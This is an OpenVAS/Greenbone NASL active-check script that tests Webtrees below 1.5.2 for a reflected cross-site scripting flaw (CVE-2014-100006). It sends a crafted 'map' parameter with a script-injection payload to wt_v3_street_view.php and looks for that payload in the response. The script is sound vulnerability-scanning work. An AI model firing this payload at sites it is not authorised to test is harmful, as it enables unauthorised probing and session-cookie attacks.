# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805140");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2015-02-18 15:28:52 +0530 (Wed, 18 Feb 2015)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-100006");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Webtrees < 1.5.2 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Webtrees is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The modules_v3/googlemap/wt_v3_street_view.php script does not
  validate input to the 'map' parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Webtrees prior to version 1.5.2.");

  script_tag(name:"solution", value:"Update to version 1.5.2 or later.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/91133");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65517");
  script_xref(name:"URL", value:"http://www.rusty-ice.de/advisory/advisory_2014001.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/webtrees", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/index.php";
  res = http_get_cache(port: port, item: url);
  if (res !~ "^HTTP/1\.[01] 200" || " WT_SESSION" >!< res)
    continue;

  # Don't use http_get_cache() to get a fresh cookie
  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req);

  cookie = eregmatch(pattern: "Set-Cookie\s*:\s*(WT_SESSION=[0-9a-z]*);", string: res);
  if (!cookie[1])
    continue;

  url = dir + "/login.php?url=index.php%3F";

  headers = make_array("Cookie", cookie[1]);

  req = http_get_req(port: port, url: url, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  if ("webtrees" >!< res || ">Login<" >!< res)
    continue;

  url = dir + '/modules_v3/googlemap/wt_v3_street_view.php?map='
            + '"><script>alert(document.cookie)</script> ; b="';

  if (http_vuln_check(port: port, url:url, check_header:TRUE,
                      pattern:"<script>alert\(document\.cookie\)</script>", extra_check:"toggleStreetView")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
